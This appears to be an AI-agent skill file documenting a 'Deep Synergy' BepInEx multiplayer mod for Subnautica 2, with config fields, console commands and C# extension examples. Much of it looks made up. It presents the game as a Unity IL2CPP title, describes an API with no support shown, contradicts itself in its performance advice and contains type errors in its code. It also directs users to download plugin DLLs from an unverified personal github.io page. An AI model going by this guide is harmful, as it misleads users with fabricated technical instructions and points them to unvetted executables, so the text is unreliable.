---
name: subnautica-ii-deep-synergy-multiplayer-mod
description: BepInEx-based cooperative multiplayer mod for Subnautica 2 with synchronized session management, shared inventory, and dynamic scaling
triggers:
  - install subnautica 2 multiplayer mod
  - set up deep synergy coop
  - configure bepinex subnautica multiplayer
  - create subnautica 2 coop session
  - sync multiplayer state subnautica
  - troubleshoot subnautica multiplayer mod
  - configure deep synergy session
  - use subnautica coop commands
---

# Subnautica II Deep Synergy Multiplayer Mod

> Skill by [ara.so](https://ara.so) — Devtools Skills collection.

## Overview

The Deep Synergy Multiplayer Mod transforms Subnautica 2 into a synchronized cooperative experience using the BepInEx modding framework. It implements deterministic session synchronization (DSS), adaptive dynamic scaling (ADS), and peer-to-peer connectivity via WebRTC for seamless multiplayer gameplay.

**Key Architecture:**
- **BepInEx Plugin** - Hooks into Unity IL2CPP runtime without modifying game files
- **Decentralized Session Management** - No central servers; uses NAT punch-through
- **Merkle Tree Inventory** - Blockchain-inspired state verification across peers
- **Adaptive Scaling** - Creature spawns and resource availability adjust to player count

## Installation

### Prerequisites

1. **Subnautica 2** installed (Steam/GOG)
2. **BepInEx 6.0.x** for IL2CPP Unity games

### Step-by-Step Installation

```bash
# 1. Install BepInEx 6.0.x
# Download from: https://github.com/BepInEx/BepInEx/releases
# Extract to Subnautica 2 game directory

# 2. Download Deep Synergy Mod
# Visit: https://maglin-jenebellah.github.io

# 3. Extract mod files
# Place contents into: <Game Directory>/BepInEx/plugins/

# 4. Verify structure
<Game Directory>/
├── BepInEx/
│   ├── plugins/
│   │   ├── DeepSynergy.dll
│   │   ├── SyncEngine.dll
│   │   └── NetworkCore.dll
│   └── config/
│       └── synergy_profile.json
```

### Verify Installation

Launch Subnautica 2. Check BepInEx console for:
```
[Info   :BepInEx] Deep Synergy Multiplayer Mod v2.1.0 loaded
[Info   :DeepSynergy] Session Manager initialized
[Info   :DeepSynergy] State Synchronizer ready
```

## Configuration

### Profile Configuration File

Create/edit `BepInEx/config/synergy_profile.json`:

```json
{
  "session_name": "Ocean Explorers",
  "max_players": 4,
  "difficulty_scale": "adaptive",
  "resource_multiplier": 1.5,
  "oxygen_consumption": 0.85,
  "creature_spawn_divider": 2,
  "enable_pvp": false,
  "friendly_fire": false,
  "shared_blueprints": true,
  "ping_locations_shared": true,
  "time_of_day_sync": "all",
  "voice_chat_integration": "discord_rpc",
  "network": {
    "port_range": "7777-7787",
    "timeout_seconds": 30,
    "max_latency_ms": 200
  },
  "api_integration": {
    "openai": {
      "enabled": false,
      "role": "narrator",
      "api_key_env": "OPENAI_API_KEY"
    },
    "claude": {
      "enabled": false,
      "role": "lore_engine",
      "api_key_env": "ANTHROPIC_API_KEY"
    }
  }
}
```

### Configuration Fields

| Field | Type | Description |
|-------|------|-------------|
| `session_name` | string | Display name for hosted session |
| `max_players` | int | Maximum concurrent players (2-8) |
| `difficulty_scale` | enum | `adaptive`, `fixed`, `manual` |
| `resource_multiplier` | float | Multiplier for harvestable resources (0.5-3.0) |
| `oxygen_consumption` | float | Oxygen drain rate (0.5-1.5, lower = slower) |
| `creature_spawn_divider` | int | Divide creature spawn rates (2 = half) |
| `shared_blueprints` | bool | All players share blueprint unlocks |
| `ping_locations_shared` | bool | Map pings visible to all players |

### Locale Configuration

Add to `synergy_profile.json`:

```json
{
  "locale": "en_US",
  "locale_override": true
}
```

Supported: `en_US`, `zh_CN`, `ja_JP`, `de_DE`, `fr_FR`, `pt_BR`, `ru_RU`, `es_ES`, `ko_KR`

## In-Game Commands

Access via BepInEx console (F5 by default):

### Session Management

```bash
# Start hosting a session
/start_server
# Output: Server created: session code = 9B2A-4C7D-E8F1

# Join existing session
/join_session 9B2A-4C7D-E8F1

# Disconnect from session
/disconnect

# View session status
/synergy_status
# Output:
# Connected peers: 3/4
# State sync: 100% complete
# Inventory hash: 0xFA342B1E
# Average latency: 45ms
```

### Runtime Configuration

```bash
# Adjust difficulty scaling (temporary)
/synergy_scale 1.5

# Force world seed synchronization
/seed_override 8251

# Toggle PvP (host only)
/pvp_toggle

# Kick player by index (host only)
/kick_player 2
```

### AI Integration Commands

```bash
# Trigger narrative generation (requires OpenAI API)
/api_narrate "exploring the deep sea trench"

# Generate creature biology log (requires Claude API)
/lore_creature "Shadow Leviathan"

# Get contextual hint
/narrator_hint
```

## Code Examples

### Programmatic Session Control

If extending the mod via BepInEx plugins:

```csharp
using DeepSynergy.Core;
using BepInEx;
using UnityEngine;

[BepInPlugin("com.yourmod.extension", "Session Extension", "1.0.0")]
public class SessionExtension : BaseUnityPlugin
{
    private SessionManager sessionManager;
    
    void Awake()
    {
        // Get Deep Synergy session manager
        sessionManager = SessionManager.Instance;
        
        // Subscribe to session events
        sessionManager.OnPlayerJoined += HandlePlayerJoined;
        sessionManager.OnStateSync += HandleStateSync;
    }
    
    void HandlePlayerJoined(PlayerInfo player)
    {
        Logger.LogInfo($"Player {player.DisplayName} joined");
        
        // Access session configuration
        var config = sessionManager.Config;
        if (config.SharedBlueprints)
        {
            SyncBlueprintsToPlayer(player);
        }
    }
    
    void HandleStateSync(SyncEvent syncEvent)
    {
        // Process synchronized state updates
        if (syncEvent.Type == SyncType.Inventory)
        {
            VerifyInventoryIntegrity(syncEvent.MerkleHash);
        }
    }
    
    void SyncBlueprintsToPlayer(PlayerInfo player)
    {
        var blueprints = BlueprintManager.GetUnlockedBlueprints();
        sessionManager.SendToPlayer(player.Id, blueprints);
    }
    
    void VerifyInventoryIntegrity(string merkleHash)
    {
        var localHash = InventoryHasher.ComputeMerkleRoot();
        if (localHash != merkleHash)
        {
            Logger.LogWarning("Inventory desync detected, requesting full sync");
            sessionManager.RequestFullSync();
        }
    }
}
```

### Custom Scaling Logic

```csharp
using DeepSynergy.Scaling;

public class CustomScalingRule : IScalingRule
{
    public void ApplyScaling(int playerCount)
    {
        var config = SessionManager.Instance.Config;
        
        // Custom resource scaling
        float resourceScale = config.ResourceMultiplier * Mathf.Sqrt(playerCount);
        ResourceSpawner.SetGlobalMultiplier(resourceScale);
        
        // Creature spawn reduction
        int spawnDivider = config.CreatureSpawnDivider * playerCount;
        CreatureManager.SetSpawnRateDivider(spawnDivider);
        
        // Oxygen efficiency boost
        float oxygenMod = config.OxygenConsumption / Mathf.Log(playerCount + 1);
        PlayerOxygenSystem.SetConsumptionRate(oxygenMod);
    }
}

// Register custom rule
ScalingEngine.RegisterRule(new CustomScalingRule());
```

### Inventory Synchronization Hook

```csharp
using DeepSynergy.Sync;

public class InventorySyncHook : MonoBehaviour
{
    void OnItemPickup(Item item)
    {
        // Create sync event
        var syncData = new InventorySyncData
        {
            PlayerId = LocalPlayer.Id,
            ItemId = item.TechType,
            Quantity = 1,
            Timestamp = NetworkTime.CurrentTime
        };
        
        // Broadcast to peers
        StateSynchronizer.BroadcastEvent(syncData);
    }
    
    void OnItemCraft(TechType techType)
    {
        if (SessionManager.Instance.Config.SharedBlueprints)
        {
            // Unlock for all players
            var unlockData = new BlueprintUnlockData
            {
                TechType = techType,
                UnlockedBy = LocalPlayer.Id
            };
            
            StateSynchronizer.BroadcastUnlock(unlockData);
        }
    }
}
```

## Common Patterns

### Host Migration on Disconnect

```csharp
void OnHostDisconnect()
{
    if (SessionManager.Instance.IsHost)
    {
        // Current host is disconnecting, migrate session
        var nextHost = SessionManager.Instance.GetNextEligibleHost();
        
        if (nextHost != null)
        {
            Logger.LogInfo($"Migrating host to {nextHost.DisplayName}");
            SessionManager.Instance.MigrateHostTo(nextHost.Id);
            
            // Transfer session state
            var sessionState = SessionStateSerializer.Capture();
            SessionManager.Instance.SendStateSnapshot(nextHost.Id, sessionState);
        }
        else
        {
            Logger.LogWarning("No eligible host for migration, ending session");
            SessionManager.Instance.EndSession();
        }
    }
}
```

### Conflict Resolution

```csharp
void ResolveInventoryConflict(InventoryConflict conflict)
{
    // Timestamp-based authority
    var localTimestamp = conflict.LocalEvent.Timestamp;
    var remoteTimestamp = conflict.RemoteEvent.Timestamp;
    
    if (remoteTimestamp > localTimestamp)
    {
        // Remote event is newer, apply it
        ApplyInventoryEvent(conflict.RemoteEvent);
    }
    else if (remoteTimestamp < localTimestamp)
    {
        // Local event is newer, broadcast to override
        StateSynchronizer.BroadcastEvent(conflict.LocalEvent, priority: true);
    }
    else
    {
        // Exact tie, use player ID as tiebreaker
        if (conflict.RemoteEvent.PlayerId > conflict.LocalEvent.PlayerId)
        {
            ApplyInventoryEvent(conflict.RemoteEvent);
        }
    }
}
```

### API Integration Example

```csharp
using System.Net.Http;
using Newtonsoft.Json;

public class NarrativeEngine
{
    private static readonly HttpClient client = new HttpClient();
    
    public async Task<string> GenerateNarrative(string context)
    {
        var apiKey = Environment.GetEnvironmentVariable("OPENAI_API_KEY");
        if (string.IsNullOrEmpty(apiKey))
        {
            Logger.LogWarning("OPENAI_API_KEY not set");
            return null;
        }
        
        client.DefaultRequestHeaders.Authorization = 
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", apiKey);
        
        var request = new
        {
            model = "gpt-4",
            messages = new[]
            {
                new { role = "system", content = "You are a narrative generator for Subnautica 2 multiplayer sessions." },
                new { role = "user", content = $"Generate a journal entry: {context}" }
            },
            max_tokens = 150
        };
        
        var response = await client.PostAsync(
            "https://api.openai.com/v1/chat/completions",
            new StringContent(JsonConvert.SerializeObject(request), System.Text.Encoding.UTF8, "application/json")
        );
        
        var result = JsonConvert.DeserializeObject<dynamic>(
            await response.Content.ReadAsStringAsync()
        );
        
        return result.choices[0].message.content;
    }
}
```

## Troubleshooting

### Session Connection Failures

**Problem:** Cannot join session, timeout errors

**Solutions:**
1. Verify firewall allows UDP ports `7777-7787`
2. Check NAT type: `Strict` NAT requires manual port forwarding
3. Increase timeout in config:
   ```json
   "network": {
     "timeout_seconds": 60
   }
   ```

**Diagnostic command:**
```bash
/network_diagnostics
# Shows: NAT type, port status, peer connectivity
```

### Inventory Desynchronization

**Problem:** Players see different inventory states

**Solutions:**
1. Force full resync: `/synergy_resync inventory`
2. Check network latency: `/synergy_status`
3. Verify Merkle hash integrity:
   ```csharp
   var localHash = InventoryHasher.ComputeMerkleRoot();
   Logger.LogInfo($"Local inventory hash: {localHash}");
   ```

### High CPU Usage

**Problem:** Performance degradation with multiple players

**Solutions:**
1. Reduce `creature_spawn_divider` in config
2. Disable API integrations if enabled
3. Lower `max_players` count
4. Adjust sync frequency in `BepInEx/config/DeepSynergy.cfg`:
   ```ini
   [Synchronization]
   StateUpdateHz = 10  # Lower from default 20
   ```

### BepInEx Load Errors

**Problem:** Mod not loading, missing dependencies

**Check:**
```bash
# View BepInEx log
<Game Directory>/BepInEx/LogOutput.log

# Common issues:
# - Missing BepInEx.IL2CPP.dll
# - Incompatible Unity version
# - Conflicting plugins
```

**Solution:**
1. Reinstall BepInEx 6.0.x IL2CPP variant
2. Remove conflicting mods from `plugins/` folder
3. Verify game version matches mod compatibility (check release notes)

### Session Code Invalid

**Problem:** "Invalid session code" when joining

**Solutions:**
1. Verify code format: `XXXX-XXXX-XXXX` (12 hex characters)
2. Check host is still running: `/synergy_status` on host
3. Ensure matching mod versions across all players
4. Regenerate session: `/restart_server` on host

### API Integration Not Working

**Problem:** Narrative/lore generation fails

**Check:**
1. Environment variables set:
   ```bash
   echo $OPENAI_API_KEY
   echo $ANTHROPIC_API_KEY
   ```
2. API enabled in config:
   ```json
   "api_integration": {
     "openai": { "enabled": true }
   }
   ```
3. Network connectivity to API endpoints
4. Check BepInEx console for API error messages

## Performance Optimization

### Recommended Settings for 4+ Players

```json
{
  "max_players": 4,
  "creature_spawn_divider": 3,
  "resource_multiplier": 2.0,
  "network": {
    "state_update_hz": 10,
    "position_update_hz": 20,
    "inventory_sync_batch": true
  },
  "optimization": {
    "async_state_processing": true,
    "threaded_merkle_computation": true,
    "delta_compression": true
  }
}
```

### Monitoring Performance

```csharp
void Update()
{
    var perfStats = SessionManager.Instance.GetPerformanceStats();
    
    if (perfStats.AverageLatency > 150)
    {
        Logger.LogWarning($"High latency detected: {perfStats.AverageLatency}ms");
    }
    
    if (perfStats.PacketLossRate > 0.05)
    {
        Logger.LogWarning($"Packet loss: {perfStats.PacketLossRate * 100}%");
    }
}
```

## Advanced Usage

### Custom Session Events

```csharp
using DeepSynergy.Events;

// Define custom event
public class BaseConstructedEvent : ISyncEvent
{
    public string PlayerId { get; set; }
    public Vector3 Position { get; set; }
    public string BasePartType { get; set; }
    public long Timestamp { get; set; }
}

// Broadcast custom event
void OnBasePartPlaced(BasePartType type, Vector3 position)
{
    var evt = new BaseConstructedEvent
    {
        PlayerId = LocalPlayer.Id,
        Position = position,
        BasePartType = type.ToString(),
        Timestamp = NetworkTime.CurrentTime
    };
    
    StateSynchronizer.BroadcastCustomEvent(evt);
}

// Handle custom event
void OnCustomEventReceived(ISyncEvent evt)
{
    if (evt is BaseConstructedEvent baseEvt)
    {
        Logger.LogInfo($"Player {baseEvt.PlayerId} built {baseEvt.BasePartType}");
    }
}
```

This skill covers the essential knowledge needed to install, configure, use, and troubleshoot the Deep Synergy Multiplayer Mod for Subnautica 2 using BepInEx.
